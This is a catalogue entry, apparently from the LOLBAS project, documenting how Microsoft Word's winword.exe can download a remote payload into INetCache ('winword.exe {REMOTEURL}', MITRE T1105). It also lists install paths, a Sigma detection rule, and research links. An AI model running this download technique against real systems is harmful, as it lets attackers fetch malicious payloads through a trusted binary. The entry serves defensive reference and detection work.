---
Author: Reegun J (OCBC Bank)
Commands:
- Category: Download
  Command: winword.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2019-07-19
Description: Microsoft Office binary
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_office_arbitrary_cli_download.yml
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files\Microsoft Office\root\Office16\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\winword.exe
- Path: C:\Program Files\Microsoft Office\Office16\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\winword.exe
- Path: C:\Program Files\Microsoft Office\Office15\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\winword.exe
- Path: C:\Program Files\Microsoft Office\Office14\winword.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\winword.exe
- Path: C:\Program Files\Microsoft Office\Office12\winword.exe
- Path: C:\Program Files\Microsoft Office\Office12\winword.exe
Name: Winword.exe
Resources:
- Link: https://twitter.com/reegun21/status/1150032506504151040
- Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# Winword.exe

Microsoft Office binary

# Path(s)

- `C:\Program Files\Microsoft Office\root\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\winword.exe`
- `C:\Program Files\Microsoft Office\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\winword.exe`
- `C:\Program Files\Microsoft Office\Office15\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\winword.exe`
- `C:\Program Files\Microsoft Office\Office14\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\winword.exe`
- `C:\Program Files\Microsoft Office\Office12\winword.exe`
- `C:\Program Files\Microsoft Office\Office12\winword.exe`

# Download Commands

Downloads payload from remote server

```batch
winword.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows



# Resource(s)

- https://twitter.com/reegun21/status/1150032506504151040
- https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7
# Acknowledgements

- Reegun J (OCBC Bank) (Authored, 2019-07-19)